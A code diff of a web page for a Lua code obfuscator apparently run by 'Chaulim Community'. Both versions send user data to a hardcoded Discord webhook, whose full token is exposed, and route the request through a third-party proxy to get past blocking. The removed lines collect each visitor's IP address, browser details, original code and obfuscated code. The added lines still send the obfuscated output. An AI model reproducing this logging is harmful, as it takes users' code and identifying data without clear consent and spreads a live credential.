@@ -88,51 +88,33 @@ transition: 0.3s;
 <script>
 
 /* =========================
-   SEU WEBHOOK (JÁ ATUALIZADO)
+   SEU WEBHOOK
 ========================= */
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1518007783071678494/ZztUYvtL0k1etMt6MeUngeGheH0zCf1zbQP9-7uWA_hLHU6GuGyQsIYO1eQmKj8NdIwr";
 
 
-// PEGA IP DO USUÁRIO
-async function getIP() {
-  try {
-    let res = await fetch("https://api.ipify.org?format=json");
-    let json = await res.json();
-    return json.ip;
-  } catch(e) { return "Desconhecido" }
-}
-
-
-async function sendLog(original, output){
-  const ip = await getIP();
-  const navegador = navigator.userAgent;
+async function sendLog(codigoOfuscado){
 
   const dados = {
-    content: "🔥 **NOVO CÓDIGO OFUSCADO**",
+    content: "✅ **NOVO CÓDIGO OFUSCADO GERADO**",
     embeds: [
       {
-        title: "CHAULIMCOMMUNITY LOG",
+        title: "CHAULIMCOMMUNITY",
         color: 16711680,
-        fields: [
-          { name: "🌐 IP do Usuário", value: "`" + ip + "`" },
-          { name: "🖥️ Navegador", value: navegador.slice(0, 120) + "..." },
-          { name: "📥 Código Original", value: "```lua\n" + (original?.slice(0, 1000) || "Vazio") + "\n```" },
-          { name: "📤 Código Ofuscado", value: "```lua\n" + (output?.slice(0, 1000) || "Vazio") + "\n```" }
-        ],
-        footer: { text: "Sistema de Obfuscador • Chaulim Community" },
-        timestamp: new Date().toISOString()
+        description: "```lua\n" + (codigoOfuscado.slice(0, 1900)) + "\n```",
+        footer: { text: "Sistema de Proteção" }
       }
     ]
   };
 
-  // ✅ MÉTODO NOVO E 100% FUNCIONAL (sem bloqueio)
+  // Método que funciona 100%
   fetch("https://api.codetabs.com/v1/proxy?quest=" + encodeURIComponent(WEBHOOK_URL), {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(dados)
   })
-  .then(() => alert("✅ LOG ENVIADO COM SUCESSO!"))
-  .catch(err => alert("❌ ERRO: " + err));
+  .then(() => alert("✅ Aviso + código enviados!"))
+  .catch(err => alert("❌ Erro: " + err));
 }
 
 
@@ -218,7 +200,9 @@ if not ok then print("❌ CHAULIM ERROR: "..tostring(err)) end
 `
 
 document.getElementById("output").value = lua
-sendLog(code, lua);
+
+// 🔥 ENVIA SÓ AVISO + CÓDIGO OFUSCADO
+sendLog(lua);
 }
 
 
